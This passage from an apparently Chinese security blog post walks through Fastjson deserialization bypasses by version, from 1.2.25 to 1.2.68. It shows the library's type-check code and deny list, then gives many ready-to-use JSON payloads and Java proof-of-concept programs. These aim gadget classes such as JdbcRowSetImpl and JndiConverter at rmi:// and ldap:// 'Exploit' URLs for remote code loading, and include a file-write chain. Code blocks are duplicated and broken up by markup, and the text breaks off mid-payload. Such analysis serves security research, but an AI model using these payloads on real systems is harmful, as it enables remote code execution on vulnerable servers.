!= <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br><br>        <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>        <span class="hljs-keyword">if</span> (typeName == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">final</span> String className = typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>        <span class="hljs-comment">// 位置1，开启了autoTypeSupport，先白名单，如果在这个白名单里面的类直接加载返回</span><br>        <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>                String accept = acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                    <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>                String deny = denyList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置2，从已存在的map中获取clazz，也就是缓存</span><br>        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) &#123;<br>            clazz = deserializers.findClass(typeName);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单</span><br>        <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>                String deny = denyList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>                String accept = acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类</span><br>        <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// ClassLoader、DataSource子类/子接口检测</span><br>            <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="hljs-comment">// classloader is danger</span><br>                    || DataSource.class.isAssignableFrom(clazz) <span class="hljs-comment">// dataSource can load jdbc driver</span><br>                    ) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>黑名单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure>



<p>绕过:</p>
<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>中实例化类，如果类名中以”L”并且以”;”结尾，则会去除头和尾的特殊字符，所以可以通过在前后加”L;”绕过</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608182349288.png" alt="image-20220608182349288"></p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V125</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V125</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword">true</span>);<br>        JSON.parseObject(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608183925157.png" alt="image-20220608183925157"></p>
<h1 id="0x3-Version-1-2-42"><a href="#0x3-Version-1-2-42" class="headerlink" title="0x3 Version 1.2.42"></a>0x3 Version 1.2.42</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>判断className前后是否为 L、; ，如果是则截取第二个字符和到倒数第二个字符</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608204855159.png" alt="image-20220608204855159"></p>
<p>双写 “LL”、”;;” 即可绕过</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608185502330.png" alt="image-20220608185502330"></p>
<h1 id="0x4-Version-1-2-43"><a href="#0x4-Version-1-2-43" class="headerlink" title="0x4 Version 1.2.43"></a>0x4 Version 1.2.43</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>中修复，如果前后有”L”、”;”就抛出异常：</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608205304105.png" alt="image-20220608205304105"></p>
<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>中可以看到如果以 “[“开头也会被特殊处理，即可绕过黑名单</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608185727632.png" alt="image-20220608185727632"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V143</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V143</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword">true</span>);<br>        JSON.parseObject(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608210021446.png" alt="image-20220608210021446"></p>
<h1 id="0x5-Version-1-2-45"><a href="#0x5-Version-1-2-45" class="headerlink" title="0x5 Version 1.2.45"></a>0x5 Version 1.2.45</h1><p>黑名单绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>:&#123;<span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>:&#123;<span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">"rmi://localhost:1099/Exploit"</span>&#125;&#125;<br></code></pre></td></tr></table></figure>



<h1 id="0x6-Version-1-2-47"><a href="#0x6-Version-1-2-47" class="headerlink" title="0x6 Version 1.2.47"></a>0x6 Version 1.2.47</h1><p>这个版本可以在不开启autotype情况下能利用成功的绕过。</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V147</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/ExecTest\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string"><code class="language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V147</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String payload = <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/ExecTest\&quot;, \n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">"&#125;"</span>;<br>        JSON.parseObject(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608212509587.png" alt="image-20220608212509587"></p>
<p>绕过分析：</p>
<ol>
<li>利用到了<code>java.lang.class</code>，这个类不在黑名单，所以checkAutotype可以过</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608221450948.png" alt="image-20220608221450948"></p>
<ol start="2">
<li>这个<code>java.lang.class</code>类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608221744667.png" alt="image-20220608221744667"></p>
<p>这里将JdbcRowSetImpl实例化并且添加到mapping中</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220613003029372.png" alt="image-20220613003029372"></p>
<ol start="3">
<li>再次循环上述步骤，加载@type类，此时的checkAutoType 可以通过TypeUtils.getClassFromMapping获得这个类</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220613003250245.png" alt="image-20220613003250245"></p>
<h1 id="0x7-Version-1-2-62"><a href="#0x7-Version-1-2-62" class="headerlink" title="0x7 Version 1.2.62"></a>0x7 Version 1.2.62</h1><p>黑名单绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">"ldap://localhost:1389/Exploit"</span>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="0x8-Version-1-2-66"><a href="#0x8-Version-1-2-66" class="headerlink" title="0x8 Version 1.2.66"></a>0x8 Version 1.2.66</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="hljs-string">&quot;Realms&quot;</span>:[<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="hljs-string">&quot;Realms&quot;</span>:[<span class="hljs-string">""</span>]&#125;<br><br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">"ldap://localhost:1389/Exploit"</span>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.Properties&quot;</span>,<span class="hljs-string">&quot;UserTransaction&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.Properties&quot;</span>,<span class="hljs-string">&quot;UserTransaction&quot;</span>:<span class="hljs-string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;<br></code></pre></td></tr></table></figure>



<h1 id="0x9-Version-1-2-67"><a href="#0x9-Version-1-2-67" class="headerlink" title="0x9 Version 1.2.67"></a>0x9 Version 1.2.67</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="hljs-string">&quot;tm&quot;</span>: &#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="hljs-string">&quot;tm&quot;</span>: &#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string">"$.tm"</span>&#125;&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;instance&quot;</span>:&#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string"><code class="language-hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;instance&quot;</span>:&#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string">"$.instance"</span>&#125;&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="0x10-Version-1-2-68"><a href="#0x10-Version-1-2-68" class="headerlink" title="0x10 Version 1.2.68"></a>0x10 Version 1.2.68</h1><p>这里与1.2.47类似，第一个@type都是使用了内置的类，在第二个@type创建时因为expectClass不为空所以能被创建出来</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220613005956922.png" alt="image-20220613005956922"></p>
<p>expectClass不为空</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220613010314669.png" alt="image-20220613010314669"></p>
<p>这个的限制是必须要继承<code>java.lang.AutoCloseable</code> ，一些poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre class=" language-hljs java">&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;targetPath&quot;</span>: <span class="hljs-string">&quot;f:/test/pwn.txt&quot;</span>,<br>        <span class="hljs-string">&quot;tempPath&quot;</span>: <span class="hljs-string">&quot;f:/test/test.txt&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,<br>        <span class="hljs-string">&quot;buffer&quot;</span>: <span class="hljs-string">&quot;文件内容 base64 编码&quot;</span>,<br>        <span class="hljs-string">&quot;outputStream&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.stream&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-number">5</span><br>    &#125;,<br>    <span class="hljs-string">&quot;close&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span 